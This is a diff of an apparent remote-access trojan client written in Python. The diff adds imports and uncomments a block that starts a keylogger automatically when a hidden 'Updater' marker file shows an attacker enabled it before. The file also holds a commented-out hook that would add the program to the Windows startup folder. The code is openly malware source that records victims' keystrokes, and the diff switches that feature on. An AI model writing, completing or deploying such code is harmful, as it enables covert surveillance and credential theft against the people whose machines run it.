@@ -15,6 +15,8 @@ import getpass
 import json
 import threading
 import time
+from datetime import date
+from tkinter import TclError, Tk
 
 
 def imports():
@@ -460,9 +462,9 @@ def run_commands():
         run_commands()
 
 
-# if os.path.isfile("C:\\Users\\" + getpass.getuser() + "\\Updater\\updateDDDMA.txt"):
-#     # Attacker has enabled keylogger on this machine before
-#     start_keylogger()
+if os.path.isfile("C:\\Users\\" + getpass.getuser() + "\\Updater\\updateDDDMA.txt"):
+    # Attacker has enabled keylogger on this machine before
+    start_keylogger()
 
 # start_up()
 # If you uncomment the line above, the file will be added to the startup directory to that the client will start up everytime the computer turns on
